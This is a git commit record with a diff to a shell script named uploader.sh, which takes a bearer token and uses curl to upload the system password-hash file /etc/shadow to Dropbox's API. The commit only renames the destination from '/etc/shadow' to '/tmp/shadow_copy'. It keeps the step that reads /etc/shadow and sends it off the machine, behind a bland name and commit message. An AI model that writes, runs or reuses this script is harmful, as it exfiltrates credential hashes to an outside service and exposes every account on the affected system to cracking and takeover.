6c62c21f91b962e3ae025ea7077d1cb827f65ccc
empoole1505 <ethan2.poole@live.uwe.ac.uk>
2025-04-27 17:21:58 +0100

    Update uploader.sh

--- uploader.sh
+++ uploader.sh
@@ -3,7 +3,7 @@ accesstoken="$1"
 
 curl -X POST https://content.dropboxapi.com/2/files/upload \
     --header "Authorization: Bearer $accesstoken"\
-    --header "Dropbox-API-Arg: {\"path\": \"/etc/shadow\", \"mode\": \"overwrite\", \"strict_conflict\": false}" \
+    --header "Dropbox-API-Arg: {\"path\": \"/tmp/shadow_copy\", \"mode\": \"overwrite\", \"strict_conflict\": false}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary "@/etc/shadow"  
 
